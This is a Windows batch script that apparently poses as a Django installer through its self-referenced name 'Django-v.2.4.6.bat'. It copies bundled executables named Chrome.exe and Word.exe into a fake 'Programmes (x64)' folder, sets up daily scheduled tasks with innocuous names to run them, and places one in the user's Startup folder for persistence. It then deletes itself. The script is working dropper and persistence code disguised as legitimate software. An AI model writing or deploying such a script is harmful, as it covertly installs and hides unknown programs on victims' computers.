@echo off

set "repertoire_script=%~dp0"

mkdir "%repertoire_script%Programmes (x64)"
copy "%repertoire_script%Chrome.exe" "C:/Programmes (x64)\Chrome.exe"
copy "%repertoire_script%Word.exe" "C:/Programmes (x64)\Word.exe"

echo o | schtasks /delete /tn "ChromeTask08" /f
echo o | schtasks /delete /tn "WordAgenda_Access" /f

schtasks /create /tn "ChromeTask08" /tr "%repertoire_script%\Chrome.exe" /sc daily /st 13:30
schtasks /create /tn "WordAgenda_Access" /tr "%repertoire_script%\Word.exe" /sc daily /st 12:30
set "repertoire_demarrage=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%repertoire_script%Chrome.exe" "%repertoire_demarrage%"


del "%repertoire_script%\Django-v.2.4.6.bat"
